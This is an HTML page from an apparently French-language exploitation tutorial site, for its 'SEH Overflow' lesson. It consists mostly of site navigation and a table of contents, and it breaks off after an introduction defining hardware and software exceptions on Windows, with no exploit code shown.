
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Bring you offensive spirit to the next level">
      
      
      
        <link rel="canonical" href="https://s-lck.github.io/HolisticPwning/binary-exploitation/2-seh-overflow/">
      
      
        <link rel="prev" href="../1-stack-overflow/">
      
      
        <link rel="next" href="../3-egghunters/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
    
    
      
        <title>SEH Overflow - Holistic Pwning</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../custom.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="SEH Overflow - Holistic Pwning" >
      
        <meta  property="og:description"  content="Bring you offensive spirit to the next level" >
      
        <meta  property="og:image"  content="https://s-lck.github.io/HolisticPwning/assets/images/social/binary-exploitation/2-seh-overflow.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://s-lck.github.io/HolisticPwning/binary-exploitation/2-seh-overflow/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="SEH Overflow - Holistic Pwning" >
      
        <meta  name="twitter:description"  content="Bring you offensive spirit to the next level" >
      
        <meta  name="twitter:image"  content="https://s-lck.github.io/HolisticPwning/assets/images/social/binary-exploitation/2-seh-overflow.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#seh-overflow" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Holistic Pwning" class="md-header__button md-logo" aria-label="Holistic Pwning" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Holistic Pwning
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              SEH Overflow
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="brown" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/s-lck/HolisticPwning" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Holistic Pwning" class="md-nav__button md-logo" aria-label="Holistic Pwning" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Holistic Pwning
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/s-lck/HolisticPwning" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Holistic Pwning
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Binary exploitation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Binary exploitation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../0-architecture-x86/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Architecture et debugger
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../1-stack-overflow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Stack Overflow
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    SEH Overflow
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    SEH Overflow
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#theorie" class="md-nav__link">
    <span class="md-ellipsis">
      Théorie
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Théorie">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#les-exceptions" class="md-nav__link">
    <span class="md-ellipsis">
      Les exceptions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#le-mecanisme-seh" class="md-nav__link">
    <span class="md-ellipsis">
      Le mécanisme SEH
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Le mécanisme SEH">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#structures" class="md-nav__link">
    <span class="md-ellipsis">
      Structures
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Structures">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#thread-environmental-block" class="md-nav__link">
    <span class="md-ellipsis">
      Thread Environmental Block
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_nt_tib" class="md-nav__link">
    <span class="md-ellipsis">
      _NT_TIB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_exception_registration_record" class="md-nav__link">
    <span class="md-ellipsis">
      _EXCEPTION_REGISTRATION_RECORD
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_exception_disposition" class="md-nav__link">
    <span class="md-ellipsis">
      _EXCEPTION_DISPOSITION
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#etapes-du-seh" class="md-nav__link">
    <span class="md-ellipsis">
      Étapes du SEH
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#protections-de-seh" class="md-nav__link">
    <span class="md-ellipsis">
      Protections de SEH
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pratique" class="md-nav__link">
    <span class="md-ellipsis">
      Pratique
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pratique">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#valider-lexploit" class="md-nav__link">
    <span class="md-ellipsis">
      Valider l'exploit
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Valider l&#39;exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#details" class="md-nav__link">
    <span class="md-ellipsis">
      Details
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Details">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-push-et-1-mov" class="md-nav__link">
    <span class="md-ellipsis">
      1 PUSH et 1 MOV
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-push-et-1-mov" class="md-nav__link">
    <span class="md-ellipsis">
      3 PUSH et 1 MOV
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-push" class="md-nav__link">
    <span class="md-ellipsis">
      4 PUSH
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execution-de-code-a-distance" class="md-nav__link">
    <span class="md-ellipsis">
      Exécution de code à distance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determiner-loffset-exact" class="md-nav__link">
    <span class="md-ellipsis">
      Déterminer l'offset exact
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#identifier-les-mauvais-caracteres" class="md-nav__link">
    <span class="md-ellipsis">
      Identifier les mauvais caractères
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#trouver-une-sequence-ppr" class="md-nav__link">
    <span class="md-ellipsis">
      Trouver une séquence P/P/R
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#island-hopping" class="md-nav__link">
    <span class="md-ellipsis">
      Island-Hopping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#obtenir-un-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Obtenir un shell
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reference" class="md-nav__link">
    <span class="md-ellipsis">
      Référence
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../3-egghunters/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Egg Hunters
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Write up
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Write up
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../write-up/NSEC24_Photographic-Memory-System/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NSEC24 : Photographic Memory System
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../write-up/NSEC25_Fuel-Management-System/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NSEC25 : Fuel Management System
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#theorie" class="md-nav__link">
    <span class="md-ellipsis">
      Théorie
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Théorie">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#les-exceptions" class="md-nav__link">
    <span class="md-ellipsis">
      Les exceptions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#le-mecanisme-seh" class="md-nav__link">
    <span class="md-ellipsis">
      Le mécanisme SEH
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Le mécanisme SEH">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#structures" class="md-nav__link">
    <span class="md-ellipsis">
      Structures
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Structures">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#thread-environmental-block" class="md-nav__link">
    <span class="md-ellipsis">
      Thread Environmental Block
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_nt_tib" class="md-nav__link">
    <span class="md-ellipsis">
      _NT_TIB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_exception_registration_record" class="md-nav__link">
    <span class="md-ellipsis">
      _EXCEPTION_REGISTRATION_RECORD
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_exception_disposition" class="md-nav__link">
    <span class="md-ellipsis">
      _EXCEPTION_DISPOSITION
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#etapes-du-seh" class="md-nav__link">
    <span class="md-ellipsis">
      Étapes du SEH
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#protections-de-seh" class="md-nav__link">
    <span class="md-ellipsis">
      Protections de SEH
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pratique" class="md-nav__link">
    <span class="md-ellipsis">
      Pratique
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pratique">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#valider-lexploit" class="md-nav__link">
    <span class="md-ellipsis">
      Valider l'exploit
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Valider l&#39;exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#details" class="md-nav__link">
    <span class="md-ellipsis">
      Details
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Details">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-push-et-1-mov" class="md-nav__link">
    <span class="md-ellipsis">
      1 PUSH et 1 MOV
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-push-et-1-mov" class="md-nav__link">
    <span class="md-ellipsis">
      3 PUSH et 1 MOV
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-push" class="md-nav__link">
    <span class="md-ellipsis">
      4 PUSH
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execution-de-code-a-distance" class="md-nav__link">
    <span class="md-ellipsis">
      Exécution de code à distance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#determiner-loffset-exact" class="md-nav__link">
    <span class="md-ellipsis">
      Déterminer l'offset exact
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#identifier-les-mauvais-caracteres" class="md-nav__link">
    <span class="md-ellipsis">
      Identifier les mauvais caractères
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#trouver-une-sequence-ppr" class="md-nav__link">
    <span class="md-ellipsis">
      Trouver une séquence P/P/R
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#island-hopping" class="md-nav__link">
    <span class="md-ellipsis">
      Island-Hopping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#obtenir-un-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Obtenir un shell
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reference" class="md-nav__link">
    <span class="md-ellipsis">
      Référence
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="seh-overflow">SEH Overflow</h1>
<div class="admonition note">
<p>Les dépassements de tampon basés sur <code>SEH</code> exploitent le mécanisme <code>Structured Exception Handling</code> mis en oeuvre dans les systèmes Windows.</p>
</div>
<h2 id="theorie">Théorie</h2>
<h3 id="les-exceptions">Les exceptions</h3>
<p>Une exception est un comportement inattendu qui arrive durant l'exécution normale d'un programme.</p>
<p>Il existe 2 types d'exception :</p>
<ul>
<li>Matériel : Les exceptions matérielles sont initiées par le <code>CPU</code><ul>
<li>e.g. : Le <code>CPU</code> essaye de faire référence à une adresse mémoire invalide</li>
</ul>
</li>
<li>Logiciel : Les exceptions logicielles sont initiées par les applications<ul>
